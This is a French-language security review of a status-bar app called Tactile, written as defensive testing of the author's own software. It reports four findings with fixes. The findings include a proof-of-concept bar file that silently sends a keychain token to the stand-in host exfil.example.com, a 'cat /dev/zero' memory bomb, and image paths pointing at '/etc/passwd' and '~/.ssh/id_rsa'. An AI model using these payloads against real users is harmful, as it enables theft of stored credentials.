# Tactile 0.3 — revue de sécurité (Karim, œil hostile)

## Contexte

Test adverse d'ingénieur sécurité avant installation, sur ma propre machine, de mon propre
logiciel. Objectif : faire planter Tactile, lui faire exécuter quelque chose à l'insu de
l'utilisateur, ou lui faire divulguer un secret. Lecture de `docs/ARCHITECTURE.md`,
`docs/VISION.md`, `src/config.rs`, `src/editeur/{mod.rs,partage.rs,icones.rs}`,
`src/sources/*`, `src/actions/*`, `src/barre/rafraichi.rs`, `src/main.rs`, `src/editeur/editeur.html`.

Cadre : fichiers et processus locaux uniquement, dans
`…/scratchpad/karim/`, avec `HOME` factice et `TACTILE_CONFIG` dédié. Jamais la barre
(`tactile` sans argument) ni `scripts/verifier.sh` ; pas d'accès à `~/.config/tactile` ;
pas de réseau hors localhost. Les « charges » malveillantes pointent vers des domaines/chemins
inoffensifs (`exfil.example.com`, `/etc/passwd`) et servent seulement à prouver *si* l'action
se produirait sans que l'utilisateur en soit informé.

Modèle de sécurité annoncé (VISION) : « une barre importée est une entrée non fiable : elle est
vérifiée, et **ce qu'elle exécute est montré avant d'être accepté** ». C'est cette promesse que
j'attaque en priorité.

## Surface d'attaque

- **Import de barre** (`.toml` / `.zip`) par `--importer`, l'éditeur (NSOpenPanel, dépôt
  base64) : archive non fiable, chemins, liens, tailles, bombes de décompression, images,
  TOML géant/imbriqué, et surtout l'écart entre *ce que la barre fait* et *ce que l'aperçu montre*.
- **Sources `[[source]]`** (commande zsh, HTTP curl, serveur MCP stdio/HTTP) : exécution
  automatique au chargement, lecture réseau, secrets `trousseau:`, DoS par sortie/latence.
- **Éditeur WKWebView** : pont JSON JS ⇄ Rust, messages non prévus, chemins arbitraires
  (`capture`, `importerImage`, `importerBarre`), injection dans l'aperçu (XSS).
- **CLI et fichiers écrits** : `--verifier`/`--exporter`/`--importer`, historique, `icones/`.

## Trouvailles

### 1. [HAUTE] Un en-tête `trousseau:` n'est pas montré dans l'aperçu d'import → exfiltration de secret

`partage::commandes` (`src/editeur/partage.rs:98`) liste, pour chaque `[[source]]`, sa
commande, son serveur MCP et **l'URL** lue — mais **jamais le champ `entetes`**. Or un en-tête
peut contenir `trousseau:service`, résolu à l'exécution par
`security find-generic-password -s service -w` (`src/sources/mod.rs:67`) puis envoyé tel quel
dans la requête HTTP. L'aperçu d'import affiche donc une source d'apparence anodine (« Adresse
lue toutes les 5 s : https://… ») en **cachant** qu'un secret du trousseau de la victime part
avec chaque requête, toutes les 5 secondes, vers un serveur choisi par l'attaquant.

Preuve (`…/karim/essais/piege.toml`) :

```toml
[[element]]
type = "texte"
source = "x"
gabarit = "{texte}"

[[source]]
nom = "x"
http = "https://exfil.example.com/collecte"
toutes_les = 5
entetes = { Authorization = "Bearer trousseau:github-token", X-Note = "ma_cle_en_clair_AKIA1234567890ABCDEF" }
```

Aperçu d'import affiché (`tactile --importer piege.toml`, FR) :

```
Barre de …/piege.toml : 1 élément.
Ce qu'elle peut lancer sur ton Mac :
  Source « x » · Adresse lue toutes les 5 s : https://exfil.example.com/collecte
attention : ligne 6 : l'en-tête « X-Note » semble contenir une clé en clair : …
```

→ L'URL de collecte est montrée, la clé *en clair* est même signalée (`cle_en_clair`), mais
l'`Authorization: Bearer trousseau:github-token` — c'est-à-dire « cette barre lira ton
trousseau et enverra le secret à exfil.example.com » — **n'apparaît nulle part**. Après
`--importer … --oui` (installé dans un `TACTILE_CONFIG` bac à sable), l'en-tête survit intact
dans le fichier :

```
http = "https://exfil.example.com/collecte"
Authorization = "Bearer trousseau:github-token"
```

Conditions : il faut qu'un mot de passe générique du nom visé existe dans le trousseau (noms
courants devinables : `github-token`, `openai`, `aws`…), et le trousseau peut demander une
autorisation à la première lecture. Mais l'aperçu, lui, est trompeur par conception : c'est une
violation directe de la promesse « ce qu'elle exécute est montré ». Ironie : la seule méthode
« propre » recommandée par l'outil (`trousseau:`) est précisément celle qui exfiltre en silence,
tandis que la clé en clair, elle, est dénoncée.

**Correction proposée.** Faire apparaître les en-têtes des sources dans `commandes()` (donc
dans l'aperçu d'import et le résumé CLI), en masquant la valeur mais en nommant le mécanisme :
p. ex. une ligne « Source « x » · En-tête `Authorization` lit un secret du trousseau
(`github-token`) et l'envoie à https://exfil.example.com/collecte ». Idéalement, exiger une
confirmation renforcée dès qu'une source importée combine un `trousseau:` et une URL non
localhost. Au minimum, signaler tout `trousseau:` présent dans une barre importée.

### 2. [MOYENNE] Sortie de commande non bornée en lecture → bombe mémoire (DoS de la barre)

`barre::executer` (`src/barre/rafraichi.rs:189`) lit la sortie d'un processus avec
`enfant.wait_with_output()` (ligne 215), qui bufferise **tout** stdout en mémoire sans plafond.
Le garde-fou de taille n'arrive qu'*après* : `sources/mod.rs:203` teste
`s.texte.len() > TAILLE_MAX` une fois la lecture finie, et le délai (`DELAI` = 10 s pour une
source, 5 s par défaut pour un `script`) ne tue le groupe qu'à expiration. Une source
`commande = "uptime"` dont on remplace discrètement la valeur par `cat /dev/zero` (ou `yes`)
émet plusieurs Go en quelques secondes avant d'être tuée → explosion mémoire du processus
Tactile, qui vise pourtant < 20 Mo. À comparer : la voie HTTP est protégée par
`curl --max-filesize 1M` (`src/sources/http.rs:57`), mais une commande/`script` zsh ne l'est pas.

Non exécuté (lancer la barre est hors cadre) : constat au niveau du code. La commande est bien
affichée dans l'aperçu d'import, mais son caractère « bombe mémoire » n'est pas évident à la
lecture, et rien ne borne la consommation.

**Correction proposée.** Lire la sortie en bornant à `TAILLE_MAX` (+ marge) pendant la lecture
(p. ex. `Read` sur `ChildStdout` avec `take(TAILLE_MAX + 1)` dans un fil dédié, comme déjà fait
pour les entrées d'archive avec `take`), puis tuer le groupe dès le dépassement — au lieu de
`wait_with_output`. Appliquer la même borne au stdout du serveur MCP stdio
(`src/sources/mcp.rs:76`, `BufReader::lines()` sans limite de longueur de ligne).

### 3. [BASSE] L'import ne restreint pas `image` au dossier `icones/` → lecture de fichiers arbitraires

À l'import, seuls les chemins de la forme `icones/<nom>` sont redessinés en PNG et recopiés
(`icones::importer_en_png`). Un chemin d'image **absolu** ou avec `~` n'est ni refusé ni
nettoyé : `partage::preparer` le laisse tel quel (il n'est ni dans `copies` ni reconnu par
`nom_d_icone`), et il persiste dans la barre installée. La barre lancée tentera alors de lire ce
fichier comme une image à chaque rechargement, et l'aperçu/éditeur le rendrait s'il décode.

Preuve (`…/karim/essais/img.toml` avec `image = "/etc/passwd"` et `image = "~/.ssh/id_rsa"`) —
l'import les accepte et les conserve :

```
tactile : /etc/passwd n'est pas une image lisible
attention : ligne 1 : image « /etc/passwd » introuvable ou illisible : …
attention : ligne 5 : image « ~/.ssh/id_rsa » introuvable ou illisible : …
```

Impact limité : il s'agit d'une tentative de **décodage image** (pas d'exfiltration du contenu
dans la barre), et le message « introuvable ou illisible » est uniforme (faible oracle
d'existence/lisibilité de chemins arbitraires). Mais cela contredit l'intention affichée
(« les logos sont redessinés en PNG, jamais copiés tels quels ») : une barre importée ne devrait
pas pouvoir référencer `/etc/...` ou `~/.ssh/...`.

**Correction proposée.** À l'import, refuser (ou vider avec avis) tout `image` qui n'est pas un
`icones/<nom>` validé par `nom_d_icone` ; ne jamais conserver de chemin absolu ou `~` venu d'une
barre importée.

### 4. [BASSE, défense en profondeur] Messages JS → Rust à chemin arbitraire, sans garde

Le pont de l'éditeur accepte de la page des messages portant un chemin libre :
`capture { chemin }` écrit un PNG à **n'importe quel** chemin (`src/editeur/mod.rs:108`, aucune
restriction), `importerImage { chemin }` et `importerBarre { chemin }` lisent n'importe quel
fichier. En l'état ce n'est atteignable que par la page de confiance (et le pilote
`TACTILE_EDITEUR_JS`), donc pas exploitable seul. Mais il n'existe aucun garde-fou si une XSS
venait à exister dans la WKWebView : `capture` deviendrait une écrasure de fichier arbitraire
avec les droits de l'app. C'est une marge de sécurité manquante, pas une faille active.

**Correction proposée.** Restreindre `capture` à un dossier attendu (temp / dossier de
captures) et rejeter les chemins hors de cette zone ; même principe pour `importerImage`/
`importerBarre`, qui n'ont de sens que via sélecteur ou dépôt.

## Ce qui a résisté

- **Durcissement de l'archive zip** (`partage.rs`) : refus de `..`, chemin absolu (`/`, `\`,
  `C:`) et lien symbolique ; plafonds 10 Mo archive / 200 entrées / 2 Mo image / 1 Mo TOML,
  vérifiés *avant* lecture puis relus avec `take(max+1)` (la taille annoncée peut mentir) ;
  reconnaissance du zip par signature `PK`, jamais par le nom ; seuls `barre.toml` et
  `icones/<image>` retenus, le reste listé en avis. Rien n'est extrait sous ses propres noms.
- **Bombe d'image** : dimensions lues sur l'en-tête (IHDR / ImageIO) sans décoder, refus
  au-delà de 4096 px, *avant* tout aperçu et toute copie.
- **TOML profondément imbriqué** : testé avec 5000 groupes `[[element.element…]]` (~100 Mo) ;
  `config::lire` renvoie proprement « recursion limit » (code 1), pas de débordement de pile.
- **Masquage des secrets** : `trousseau:` résolu dans le fil, chaque secret lu remplacé par
  `•••` dans toute erreur (`masquer`) ; vérifié avec un serveur local qui renvoie l'en-tête
  reçu — le secret ne sort ni au journal ni dans le message. Détection des clés en clair
  (`cle_en_clair`). (NB : voir trouvaille 1, c'est l'*aperçu d'import* qui expose, pas le journal.)
- **`url_permise`** : seules `https://` et `http://{localhost,127.0.0.1,[::1]}` ; les ruses
  `http://localhost.evil.com`, `http://127.0.0.1@evil.com`, `file://`, `ftp://` sont refusées.
  Pas de redirection suivie (`--proto`, pas de `-L`), `-q` ignore `~/.curlrc`, URL et en-têtes
  passés par stdin (invisibles dans `ps`).
- **XSS dans l'aperçu de l'éditeur** : tout texte contrôlé par la barre importée (`texte`,
  `couleur`, `symbole`, `gabarit`, `valeur`, `app`, avis) passe par `esc()` avant insertion
  DOM ; les champs non textuels (`type`, `largeur`, `taille`) sont contraints par le typage
  Rust (enum / `f64`) à la désérialisation avant d'atteindre la page ; les data URL d'images et
  de symboles sont produites par Rust. U+2028/U+2029 dans le JSON passé à `evaluateJavaScript`
  considérés : inoffensifs sur un JavaScriptCore moderne. Pas d'injection trouvée.
- **Exécution différée à l'import** : l'ouverture/l'aperçu d'une barre n'exécute aucun shell
  (seulement résolution d'app sans lancement, décodage d'image, lookup de symbole) ; les sources
  ne partent qu'au lancement de la barre, et les processus tournent en groupe tué au
  remplacement (`process_group(0)`, `tuer_tous`).
- **Robustesse config** : symbole/couleur invalides refusés avant écriture, barre vide refusée,
  historique relu avant restauration, une barre illisible ne s'écrase pas (mise de côté).

## Recommandations ordonnées

1. **(Haute) Divulguer les en-têtes des sources dans l'aperçu d'import** et nommer tout usage de
   `trousseau:`, avec confirmation renforcée pour « secret du trousseau + URL non localhost »
   (trouvaille 1). C'est la seule entorse nette au modèle de sécurité annoncé.
2. **(Moyenne) Borner la lecture de stdout des commandes/`script` et du MCP stdio** pendant la
   lecture, pas après, et tuer dès dépassement (trouvaille 2).
3. **(Basse) Refuser/vider les chemins `image` non `icones/<nom>` venus d'un import**
   (trouvaille 3).
4. **(Basse) Confiner `capture`/`importerImage`/`importerBarre` à des chemins attendus**
   (trouvaille 4), en défense en profondeur de la WKWebView.
